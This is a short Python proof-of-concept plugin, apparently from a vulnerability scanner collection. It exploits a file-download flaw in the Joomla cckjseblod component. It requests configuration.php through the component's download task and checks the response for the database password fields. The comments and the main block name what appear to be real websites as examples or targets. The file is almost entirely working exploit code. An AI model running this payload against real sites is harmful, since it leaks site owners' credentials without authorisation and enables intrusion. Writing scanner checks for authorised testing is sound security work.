from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/python
#-*- encoding:utf-8 -*-
# Joomla cckjseblod exploit LFD
#eg:http://www.starmarketingonline.com/index.php
#https://www.bugscan.net/#!/x/22903


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=com_cckjseblod&task=download&file=configuration.php'
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code == 200 and 'class JConfig {' in res and '$log_path' in res and '$password' in res:
            output(url,result,'warning')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_2dfd7f88ee6d799d20acc63dd4415740.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_2dfd7f88ee6d799d20acc63dd4415740.py
#/root/github/poccreate/codesrc/exp-1637.py